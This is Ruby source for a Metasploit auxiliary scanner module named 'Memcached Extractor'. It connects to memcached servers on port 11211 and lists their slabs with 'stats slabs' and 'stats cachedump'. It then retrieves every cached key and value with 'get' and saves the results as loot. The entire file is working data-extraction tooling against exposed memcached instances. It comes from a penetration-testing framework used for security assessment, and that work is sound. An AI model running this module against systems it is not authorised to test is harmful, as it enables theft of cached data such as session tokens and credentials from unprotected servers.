##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
      info,
      'Name'          => 'Memcached Extractor',
      'Description'   => %q(
        This module extracts the slabs from a memcached instance.  It then
        finds the keys and values stored in those slabs.
      ),
      'Author'        => [ 'Paul Deardorff <paul_deardorff[at]rapid7.com>' ],
      'License'       => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://github.com/memcached/memcached/blob/master/doc/protocol.txt']
        ]
    ))

    register_options(
      [
        Opt::RPORT(11211)
      ], self.class
    )

    register_advanced_options(
      [
        OptInt.new('MAXKEYS', [true, 'Maximum number of keys to be pulled from each slab', 100]),
        OptInt.new('PRINTKEYS', [true, 'Number of keys shown in preview table for each instance', 10])
      ], self.class
    )
  end

  def max_keys
    datastore['MAXKEYS'].to_i
  end

  def print_keys
    datastore['PRINTKEYS'].to_i
  end

  def localhost?(ip)
    %w(localhost 127.0.0.1).include?(ip)
  end

  # Returns array of keys for all slabs
  def enumerate_keys
    keys = []
    enumerate_slab_ids.each do |sid|
      loop do
        sock.send("stats cachedump #{sid} #{max_keys}\r\n", 0)
        data = sock.recv(4096)
        break if !data || data.length == 0
        matches = /^ITEM (?<key>.*) \[/.match(data)
        keys << matches[:key] if matches
        break if data =~ /^END/
      end
    end
    keys
  end

  # Returns array of slab ids as strings
  def enumerate_slab_ids
    sock.send("stats slabs\r\n", 0)
    slab_ids = []
    loop do
      data = sock.recv(4096)
      break if !data || data.length == 0
      matches = data.scan(/^STAT (?<slab_id>(\d)*):/)
      slab_ids << matches
      break if data =~ /^END/
    end
    slab_ids.flatten!
    slab_ids.uniq! || []
  end

  def data_for_keys(keys = [])
    all_data = {}
    keys.each do |key|
      sock.send("get #{key}\r\n", 0)
      data = []
      loop do
        data_part = sock.recv(4096)
        break if !data_part || data_part.length == 0
        data << data_part
        break if data_part =~ /^END/
      end
      all_data[key] = data.join
    end
    all_data
  end

  def determine_version
    sock.send("version\r\n", 0)
    stats = sock.recv(4096)
    if /^VERSION (?<version>[\d\.]+)/ =~ stats
      version
    else
      nil
    end
  end

  def run_host(ip)
    peer = "#{ip}:#{rport}"
    vprint_status("Connecting to memcached server...")
    begin
      connect
      if (version = determine_version)
        vprint_good("Connected to memcached version #{version}")
        unless localhost?(ip)
          report_service(
            host: ip,
            name: 'memcached',
            port: rport,
            proto: 'tcp',
            info: version
          )
        end
      else
        print_error("unable to determine memcached protocol version")
        return
      end
      keys = enumerate_keys
      print_good("Found #{keys.size} keys")
      return if keys.size == 0

      data = data_for_keys(keys)
      result_table = Rex::Text::Table.new(
        'Header'  => "Keys/Values Found for #{peer}",
        'Indent'  => 1,
        'Columns' => [ 'Key', 'Value' ]
      )
      data.take(print_keys).each { |key, value| result_table << [key, value.inspect] }
      print_line
      print_line("#{result_table}")
      unless localhost?(ip)
        path = store_loot('memcached.dump', 'text/plain', ip, data, 'memcached.txt', 'Memcached extractor')
        print_good("memcached loot stored at #{path}")
      end
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout
      vprint_error("Could not connect to memcached server!")
    end
  end
end
